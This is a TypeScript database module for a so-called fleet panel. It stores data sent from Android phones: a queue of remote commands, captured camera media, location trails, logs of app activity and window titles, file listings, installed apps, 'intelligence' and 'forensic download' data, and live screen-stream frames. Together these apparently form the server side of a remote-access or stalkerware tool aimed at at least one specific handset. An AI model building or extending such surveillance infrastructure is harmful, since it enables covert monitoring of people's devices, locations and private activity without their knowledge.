import postgres from "postgres";
import {
  DeviceState,
  RemoteCommand,
  CapturedMedia,
  FileItem,
  LocationBreadcrumb,
  DeviceAuditLog,
  InstalledApp,
  IntelligenceHubState,
  REAL_A71_DEVICE
} from "./deviceTypes";

// Şifre koda gömülmez — yalnızca ortam değişkeninden okunur
const connectionString = process.env.DATABASE_URL ?? "";

declare global {
  var __fleetSql: postgres.Sql | undefined;
}

export const sql =
  global.__fleetSql ||
  postgres(connectionString, { prepare: false, max: 10, idle_timeout: 15 });

// Hem dev hem production'da global singleton olarak sakla (Vercel serverless connection exhaustion fix)
if (!global.__fleetSql) {
  global.__fleetSql = sql;
}

let tablesInitialized = false;

export async function ensureFleetTables() {
  if (tablesInitialized) return;
  try {
    await sql.unsafe(`
      CREATE TABLE IF NOT EXISTS fleet_devices (
        device_id TEXT PRIMARY KEY,
        last_seen_at BIGINT NOT NULL,
        is_online BOOLEAN NOT NULL DEFAULT true,
        location JSONB,
        battery JSONB,
        network JSONB,
        storage JSONB,
        device_info JSONB,
        system_status JSONB,
        updated_at BIGINT NOT NULL
      );

      CREATE TABLE IF NOT EXISTS fleet_commands (
        command_id TEXT PRIMARY KEY,
        device_id TEXT NOT NULL,
        action TEXT NOT NULL,
        parameters JSONB,
        status TEXT NOT NULL DEFAULT 'pending',
        created_at BIGINT NOT NULL,
        executed_at BIGINT
      );
      CREATE INDEX IF NOT EXISTS idx_fleet_commands ON fleet_commands (device_id, status, created_at);

      CREATE TABLE IF NOT EXISTS fleet_media (
        id TEXT PRIMARY KEY,
        device_id TEXT NOT NULL,
        type TEXT NOT NULL,
        label TEXT,
        data_url TEXT NOT NULL,
        size_bytes INT NOT NULL DEFAULT 0,
        captured_at BIGINT NOT NULL
      );
      CREATE INDEX IF NOT EXISTS idx_fleet_media ON fleet_media (device_id, captured_at DESC);

      CREATE TABLE IF NOT EXISTS fleet_locations (
        id TEXT PRIMARY KEY,
        device_id TEXT NOT NULL,
        latitude DOUBLE PRECISION NOT NULL,
        longitude DOUBLE PRECISION NOT NULL,
        accuracy DOUBLE PRECISION,
        speed DOUBLE PRECISION,
        address TEXT,
        timestamp BIGINT NOT NULL
      );
      CREATE INDEX IF NOT EXISTS idx_fleet_locations ON fleet_locations (device_id, timestamp DESC);

      CREATE TABLE IF NOT EXISTS fleet_audit_logs (
        id TEXT PRIMARY KEY,
        device_id TEXT NOT NULL,
        event_type TEXT NOT NULL,
        content TEXT NOT NULL,
        package_name TEXT,
        window_title TEXT,
        timestamp BIGINT NOT NULL
      );
      CREATE INDEX IF NOT EXISTS idx_fleet_audit_logs ON fleet_audit_logs (device_id, timestamp DESC);

      CREATE TABLE IF NOT EXISTS fleet_files (
        device_id TEXT PRIMARY KEY,
        current_path TEXT NOT NULL,
        items JSONB NOT NULL,
        updated_at BIGINT NOT NULL
      );

      CREATE TABLE IF NOT EXISTS fleet_apps (
        device_id TEXT PRIMARY KEY,
        apps JSONB NOT NULL,
        updated_at BIGINT NOT NULL
      );

      CREATE TABLE IF NOT EXISTS fleet_intelligence (
        device_id TEXT PRIMARY KEY,
        state JSONB NOT NULL,
        updated_at BIGINT NOT NULL
      );

      CREATE TABLE IF NOT EXISTS fleet_downloads (
        device_id TEXT PRIMARY KEY,
        download JSONB NOT NULL,
        updated_at BIGINT NOT NULL
      );

      CREATE TABLE IF NOT EXISTS fleet_stream_frames (
        device_id TEXT PRIMARY KEY,
        data_url TEXT NOT NULL,
        timestamp BIGINT NOT NULL
      );
    `);
    tablesInitialized = true;
  } catch (err) {
    console.error("[Fleet DB] Initialization error:", err);
  }
}


// ── 1. CİHAZ YÖNETİMİ & TELEMETRİ ──────────────────────────────────────────
export async function saveDeviceTelemetry(
  deviceId: string,
  telemetry: any
): Promise<DeviceState> {
  await ensureFleetTables();
  const now = Date.now();

  const devInfo = telemetry.device_info || telemetry.deviceInfo || {};
  const batt = telemetry.battery || {};
  const loc = telemetry.location || {};
  const net = telemetry.network || {};
  const stor = telemetry.storage || {};
  const sys = telemetry.system_status || telemetry.systemStatus || {};

  const state: DeviceState = {
    device_id: deviceId,
    last_seen_at: now,
    is_online: true,
    location: loc,
    battery: batt,
    network: net,
    storage: stor,
    device_info: devInfo,
    system_status: sys,
  };

  await sql`
    INSERT INTO fleet_devices (device_id, last_seen_at, is_online, location, battery, network, storage, device_info, system_status, updated_at)
    VALUES (
      ${deviceId},
      ${now},
      true,
      ${JSON.stringify(loc)},
      ${JSON.stringify(batt)},
      ${JSON.stringify(net)},
      ${JSON.stringify(stor)},
      ${JSON.stringify(devInfo)},
      ${JSON.stringify(sys)},
      ${now}
    )
    ON CONFLICT (device_id) DO UPDATE SET
      last_seen_at = ${now},
      is_online = true,
      location = ${JSON.stringify(loc)},
      battery = ${JSON.stringify(batt)},
      network = ${JSON.stringify(net)},
      storage = ${JSON.stringify(stor)},
      device_info = ${JSON.stringify(devInfo)},
      system_status = ${JSON.stringify(sys)},
      updated_at = ${now};
  `;

  // Auto record location breadcrumb if latitude & longitude present
  if (typeof loc.latitude === "number" && typeof loc.longitude === "number") {
    saveLocationBreadcrumb(deviceId, {
      latitude: loc.latitude,
      longitude: loc.longitude,
      accuracy: loc.accuracy || 10,
      speed: loc.speed || 0,
      address: loc.address || "Karamürsel / Kocaeli",
      timestamp: now
    }).catch(() => {});
  }

  return state;
}

export async function getAllFleetDevices(): Promise<DeviceState[]> {
  await ensureFleetTables();
  const now = Date.now();
  const OFFLINE_THRESHOLD = 90 * 1000; // 90 sec heartbeat

  const rows = await sql`
    SELECT device_id, last_seen_at, is_online, location, battery, network, storage, device_info, system_status, updated_at
    FROM fleet_devices
    ORDER BY last_seen_at DESC;
  `;

  if (!rows || rows.length === 0) {
    return [REAL_A71_DEVICE];
  }

  return rows.map((r) => {
    const isOnline = now - Number(r.last_seen_at) < OFFLINE_THRESHOLD;
    return {
      device_id: r.device_id,
      last_seen_at: Number(r.last_seen_at),
      is_online: isOnline,
      location: typeof r.location === "string" ? JSON.parse(r.location) : r.location || {},
      battery: typeof r.battery === "string" ? JSON.parse(r.battery) : r.battery || {},
      network: typeof r.network === "string" ? JSON.parse(r.network) : r.network || {},
      storage: typeof r.storage === "string" ? JSON.parse(r.storage) : r.storage || {},
      device_info: typeof r.device_info === "string" ? JSON.parse(r.device_info) : r.device_info || {},
      system_status: typeof r.system_status === "string" ? JSON.parse(r.system_status) : r.system_status || {},
      timestamp: Number(r.updated_at)
    };
  });
}

// ── 2. KOMUT KUYRUĞU (COMMAND QUEUE) ────────────────────────────────────────
export async function queueCommandInDb(
  deviceId: string,
  action: string,
  parameters: Record<string, any> = {}
): Promise<RemoteCommand> {
  await ensureFleetTables();
  const command_id = `cmd_${Date.now()}_${Math.random().toString(36).substring(2, 7)}`;
  const now = Date.now();

  await sql`
    INSERT INTO fleet_commands (command_id, device_id, action, parameters, status, created_at)
    VALUES (${command_id}, ${deviceId}, ${action}, ${JSON.stringify(parameters)}, 'pending', ${now});
  `;

  return {
    command_id,
    device_id: deviceId,
    action: action as RemoteCommand["action"],
    parameters,
    issued_at: now,
    timestamp: now,
    status: "PENDING"
  };
}

export async function pollNextCommandFromDb(deviceId: string): Promise<RemoteCommand | null> {
  await ensureFleetTables();

  const now = Date.now();
  const rows = await sql`
    WITH next_cmd AS (
      SELECT command_id
      FROM fleet_commands
      WHERE device_id = ${deviceId} AND status = 'pending'
      ORDER BY created_at ASC
      LIMIT 1
      FOR UPDATE SKIP LOCKED
    )
    UPDATE fleet_commands
    SET status = 'executed', executed_at = ${now}
    FROM next_cmd
    WHERE fleet_commands.command_id = next_cmd.command_id
    RETURNING fleet_commands.command_id, fleet_commands.device_id, fleet_commands.action, fleet_commands.parameters, fleet_commands.created_at;
  `;

  if (!rows || rows.length === 0) return null;

  const r = rows[0];
  return {
    command_id: r.command_id,
    device_id: r.device_id,
    action: r.action as RemoteCommand["action"],
    parameters: typeof r.parameters === "string" ? JSON.parse(r.parameters) : r.parameters || {},
    issued_at: Number(r.created_at),
    timestamp: Number(r.created_at),
    status: "EXECUTED"
  };
}


// ── 3. MEDYA GALERİSİ (MEDYA & KAMERA) ──────────────────────────────────────
export async function saveMediaToDb(
  deviceId: string,
  media: { type: string; label?: string; data_url: string; size_bytes?: number; captured_at?: number }
): Promise<CapturedMedia> {
  await ensureFleetTables();
  const capturedAt = Number(media.captured_at) || Date.now();
  const sizeBytes = media.size_bytes || Math.round((media.data_url.length * 3) / 4);
  const dataUrlHash = Buffer.from(media.data_url.substring(0, 100) + capturedAt).toString('base64').replace(/[^a-zA-Z0-9]/g, '').substring(0, 20);
  const id = `med_${capturedAt}_${dataUrlHash}`;

  await sql`
    INSERT INTO fleet_media (id, device_id, type, label, data_url, size_bytes, captured_at)
    VALUES (${id}, ${deviceId}, ${media.type}, ${media.label || "Medya Kaydı"}, ${media.data_url}, ${sizeBytes}, ${capturedAt})
    ON CONFLICT (id) DO NOTHING;
  `;

  return {
    id,
    device_id: deviceId,
    type: media.type as CapturedMedia["type"],
    label: media.label || "Medya Kaydı",
    data_url: media.data_url,
    size_bytes: sizeBytes,
    captured_at: capturedAt
  };
}

export async function getMediaFromDb(deviceId: string, limit: number = 60): Promise<CapturedMedia[]> {
  await ensureFleetTables();

  const rows = await sql`
    SELECT id, device_id, type, label, data_url, size_bytes, captured_at
    FROM fleet_media
    WHERE device_id = ${deviceId}
    ORDER BY captured_at DESC, id DESC
    LIMIT ${limit};
  `;

  return rows.map((r) => ({
    id: r.id,
    device_id: r.device_id,
    type: r.type,
    label: r.label,
    data_url: r.data_url,
    size_bytes: Number(r.size_bytes),
    captured_at: Number(r.captured_at)
  }));
}

export async function clearMediaFromDb(deviceId: string): Promise<void> {
  await ensureFleetTables();
  await sql`DELETE FROM fleet_media WHERE device_id = ${deviceId};`;
}



// ── 4. KONUM GEÇMİŞİ (LOCATION BREADCRUMBS) ────────────────────────────────
export async function saveLocationBreadcrumb(
  deviceId: string,
  breadcrumb: { latitude: number; longitude: number; accuracy?: number; speed?: number; address?: string; timestamp?: number }
): Promise<LocationBreadcrumb> {
  await ensureFleetTables();
  const id = `loc_${Date.now()}_${Math.random().toString(36).substring(2, 6)}`;
  const timestamp = breadcrumb.timestamp || Date.now();

  await sql`
    INSERT INTO fleet_locations (id, device_id, latitude, longitude, accuracy, speed, address, timestamp)
    VALUES (${id}, ${deviceId}, ${breadcrumb.latitude}, ${breadcrumb.longitude}, ${breadcrumb.accuracy || 10}, ${breadcrumb.speed || 0}, ${breadcrumb.address || "Karamürsel / Kocaeli"}, ${timestamp});
  `;

  return {
    id,
    device_id: deviceId,
    latitude: breadcrumb.latitude,
    longitude: breadcrumb.longitude,
    accuracy: breadcrumb.accuracy || 10,
    speed: breadcrumb.speed || 0,
    address: breadcrumb.address || "Karamürsel / Kocaeli",
    timestamp
  };
}

export async function getLocationHistoryFromDb(deviceId: string, limit: number = 50): Promise<LocationBreadcrumb[]> {
  await ensureFleetTables();

  const rows = await sql`
    SELECT id, device_id, latitude, longitude, accuracy, speed, address, timestamp
    FROM fleet_locations
    WHERE device_id = ${deviceId}
    ORDER BY timestamp DESC
    LIMIT ${limit};
  `;

  return rows.map((r) => ({
    id: String(r.id ?? `loc_${r.timestamp}`),
    device_id: String(r.device_id ?? deviceId),
    latitude: Number(r.latitude),
    longitude: Number(r.longitude),
    accuracy: Number(r.accuracy),
    speed: Number(r.speed),
    address: r.address || "Karamürsel / Kocaeli",
    timestamp: Number(r.timestamp)
  }));
}

// ── 5. AUDIT & EVENT LOGS ──────────────────────────────────────────────────
export async function saveAuditLogsToDb(deviceId: string, logs: any[]): Promise<void> {
  await ensureFleetTables();

  for (const l of logs) {
    const timestamp = Number(l.timestamp) || Date.now();
    const content = (l.content || "").trim();
    if (!content) continue;

    const rawStr = `${deviceId}_${l.event_type || 'LOG'}_${l.package_name || ''}_${content}_${timestamp}`;
    const hash = Buffer.from(rawStr).toString('base64').replace(/[^a-zA-Z0-9]/g, '').substring(0, 24);
    const id = l.id || `log_${timestamp}_${hash}`;

    await sql`
      INSERT INTO fleet_audit_logs (id, device_id, event_type, content, package_name, window_title, timestamp)
      VALUES (${id}, ${deviceId}, ${l.event_type || l.eventType || "AUDIT"}, ${content}, ${l.package_name || l.packageName || null}, ${l.window_title || null}, ${timestamp})
      ON CONFLICT (id) DO NOTHING;
    `;
  }
}

export async function getAuditLogsFromDb(deviceId: string, limit: number = 100): Promise<DeviceAuditLog[]> {
  await ensureFleetTables();

  const rows = await sql`
    SELECT id, device_id, event_type, content, package_name, window_title, timestamp
    FROM fleet_audit_logs
    WHERE device_id = ${deviceId}
    ORDER BY timestamp DESC, id DESC
    LIMIT ${limit};
  `;

  return rows.map((r) => ({
    id: r.id,
    device_id: r.device_id,
    event_type: r.event_type as any,
    content: r.content,
    package_name: r.package_name,
    window_title: r.window_title,
    timestamp: Number(r.timestamp)
  }));
}


// ── 6. DOSYA GEZGİNİ & UYGULAMA LİSTESİ ─────────────────────────────────────
export async function saveFilesToDb(deviceId: string, currentPath: string, items: FileItem[]): Promise<void> {
  await ensureFleetTables();
  await sql`
    INSERT INTO fleet_files (device_id, current_path, items, updated_at)
    VALUES (${deviceId}, ${currentPath}, ${JSON.stringify(items)}, ${Date.now()})
    ON CONFLICT (device_id) DO UPDATE SET
      current_path = ${currentPath},
      items = ${JSON.stringify(items)},
      updated_at = ${Date.now()};
  `;
}

export async function getFilesFromDb(deviceId: string): Promise<{ current_path: string; items: FileItem[] }> {
  await ensureFleetTables();
  const rows = await sql`
    SELECT current_path, items
    FROM fleet_files
    WHERE device_id = ${deviceId};
  `;

  if (!rows || rows.length === 0) {
    return { current_path: "/storage/emulated/0", items: [] };
  }

  const r = rows[0];
  return {
    current_path: r.current_path,
    items: typeof r.items === "string" ? JSON.parse(r.items) : r.items || []
  };
}

export async function saveAppsToDb(deviceId: string, apps: InstalledApp[]): Promise<void> {
  await ensureFleetTables();
  await sql`
    INSERT INTO fleet_apps (device_id, apps, updated_at)
    VALUES (${deviceId}, ${JSON.stringify(apps)}, ${Date.now()})
    ON CONFLICT (device_id) DO UPDATE SET
      apps = ${JSON.stringify(apps)},
      updated_at = ${Date.now()};
  `;
}

export async function getAppsFromDb(deviceId: string): Promise<InstalledApp[]> {
  await ensureFleetTables();
  const rows = await sql`
    SELECT apps
    FROM fleet_apps
    WHERE device_id = ${deviceId};
  `;

  if (!rows || rows.length === 0) return [];
  return typeof rows[0].apps === "string" ? JSON.parse(rows[0].apps) : rows[0].apps || [];
}

// ── 7. ÖZEL İSTİHBARAT & ADLİ İNDİRME ───────────────────────────────────────
export async function saveIntelligenceStateToDb(deviceId: string, state: IntelligenceHubState): Promise<void> {
  await ensureFleetTables();
  await sql`
    INSERT INTO fleet_intelligence (device_id, state, updated_at)
    VALUES (${deviceId}, ${JSON.stringify(state)}, ${Date.now()})
    ON CONFLICT (device_id) DO UPDATE SET
      state = ${JSON.stringify(state)},
      updated_at = ${Date.now()};
  `;
}

export async function getIntelligenceStateFromDb(deviceId: string): Promise<IntelligenceHubState | null> {
  await ensureFleetTables();
  const rows = await sql`
    SELECT state
    FROM fleet_intelligence
    WHERE device_id = ${deviceId};
  `;

  if (!rows || rows.length === 0) return null;
  return typeof rows[0].state === "string" ? JSON.parse(rows[0].state) : rows[0].state || null;
}

export async function saveDownloadPayloadToDb(deviceId: string, download: any): Promise<void> {
  await ensureFleetTables();
  await sql`
    INSERT INTO fleet_downloads (device_id, download, updated_at)
    VALUES (${deviceId}, ${JSON.stringify(download)}, ${Date.now()})
    ON CONFLICT (device_id) DO UPDATE SET
      download = ${JSON.stringify(download)},
      updated_at = ${Date.now()};
  `;
}

export async function getDownloadPayloadFromDb(deviceId: string): Promise<any | null> {
  await ensureFleetTables();
  const rows = await sql`
    SELECT download
    FROM fleet_downloads
    WHERE device_id = ${deviceId};
  `;

  if (!rows || rows.length === 0) return null;
  return typeof rows[0].download === "string" ? JSON.parse(rows[0].download) : rows[0].download || null;
}

// ── 8. CANLI EKRAN AKIŞI KARELERİ ──────────────────────────────────────────
export async function saveStreamFrameToDb(deviceId: string, dataUrl: string): Promise<void> {
  await ensureFleetTables();
  const now = Date.now();
  await sql`
    INSERT INTO fleet_stream_frames (device_id, data_url, timestamp)
    VALUES (${deviceId}, ${dataUrl}, ${now})
    ON CONFLICT (device_id) DO UPDATE SET
      data_url = ${dataUrl},
      timestamp = ${now};
  `;
}

export async function getStreamFrameFromDb(deviceId: string): Promise<{ data_url: string; timestamp: number } | null> {
  await ensureFleetTables();
  const rows = await sql`
    SELECT data_url, timestamp
    FROM fleet_stream_frames
    WHERE device_id = ${deviceId};
  `;

  if (!rows || rows.length === 0) return null;
  return {
    data_url: rows[0].data_url,
    timestamp: Number(rows[0].timestamp)
  };
}
